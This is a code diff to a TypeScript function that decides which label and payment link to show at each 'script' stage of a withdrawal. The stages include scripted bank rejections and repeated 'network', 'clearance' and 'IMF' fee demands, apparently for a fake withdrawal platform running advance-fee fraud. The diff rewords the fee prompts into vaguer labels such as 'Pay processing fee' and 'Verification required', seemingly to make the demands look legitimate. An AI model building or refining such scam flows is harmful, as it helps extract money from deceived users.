@@ -59,7 +59,7 @@ export function resolveWithdrawalScriptStage(input: ResumeInput): WithdrawalScri
 
   if (scriptPhase === "PENDING_TIMER") {
     if (userStep === 1) {
-      return navigate("Processing network fee", payChargeUrl(id), "amber");
+      return navigate("Processing payment", payChargeUrl(id), "amber");
     }
     if (userStep === 3 && imf === "PAID") {
       return navigate("Sending to receiving bank", `/dashboard/withdrawals/${id}/script/pending`, "amber");
@@ -68,19 +68,19 @@ export function resolveWithdrawalScriptStage(input: ResumeInput): WithdrawalScri
   }
 
   if (scriptPhase === "BANK_REJECTED") {
-    return navigate("Transfer rejected — tap to continue", `/dashboard/withdrawals/${id}/script/bank-rejected`, "amber");
+    return navigate("Transfer declined", `/dashboard/withdrawals/${id}/script/bank-rejected`, "amber");
   }
 
   if (scriptPhase === "AWAITING_IMF_CLEARANCE") {
     if (imf === "UNPAID" || imf === "REJECTED") {
-      return navigate("Pay clearance fee", `/dashboard/withdrawals/${id}/imf-clearance/pay`, "brand");
+      return navigate("Pay processing fee", `/dashboard/withdrawals/${id}/imf-clearance/pay`, "brand");
     }
-    return navigate("Clearance fee due", `/dashboard/withdrawals/${id}/script/imf-clearance`, "brand");
+    return navigate("Verification required", `/dashboard/withdrawals/${id}/script/imf-clearance`, "brand");
   }
 
   if (scriptPhase === "IMF_PENDING_VERIFICATION") {
     return {
-      label: "Clearance fee verifying",
+      label: "Verification in progress",
       tone: "amber",
       action: "navigate",
       resumeUrl: `/dashboard/withdrawals/${id}/script/imf-clearance`,
@@ -91,15 +91,15 @@ export function resolveWithdrawalScriptStage(input: ResumeInput): WithdrawalScri
   if (status === "AWAITING_CHARGE_PAYMENT") {
     if (charge === "UNPAID" || charge === "REJECTED") {
       if (userStep === 0 || userStep === 1 || userStep === 3) {
-        return navigate("Pay network fee", payChargePaymentUrl(id), "brand");
+        return navigate("Pay processing fee", payChargePaymentUrl(id), "brand");
       }
-      return navigate("Pay network fee", payChargeUrl(id), "brand");
+      return navigate("Pay processing fee", payChargeUrl(id), "brand");
     }
     if (charge === "PENDING_VERIFICATION") {
-      return navigate("Fee payment verifying", payChargeUrl(id), "amber");
+      return navigate("Payment verifying", payChargeUrl(id), "amber");
     }
     if (charge === "PAID" && userStep === 1) {
-      return navigate("Processing network fee", payChargeUrl(id), "amber");
+      return navigate("Processing payment", payChargeUrl(id), "amber");
     }
   }
 
@@ -119,16 +119,12 @@ export function resolveWithdrawalScriptStage(input: ResumeInput): WithdrawalScri
     !isWithdrawalScriptCycleComplete(withdrawal, userStep)
   ) {
     if (userStep === 1) {
-      return navigate(
-        "Transfer rejected — tap to continue",
-        `/dashboard/withdrawals/${id}/script/bank-rejected`,
-        "amber"
-      );
+      return navigate("Transfer declined", `/dashboard/withdrawals/${id}/script/bank-rejected`, "amber");
     }
     if (userStep === 3) {
-      return navigate("Pay network fee (stage 3)", payChargePaymentUrl(id), "brand");
+      return navigate("Pay processing fee", payChargePaymentUrl(id), "brand");
     }
-    return navigate("Continue withdrawal", payChargeUrl(id), "amber");
+    return navigate("Action required", payChargeUrl(id), "amber");
   }
 
   if (scriptPhase !== "NONE" && scriptPhase !== "SCRIPT_COMPLETE") {
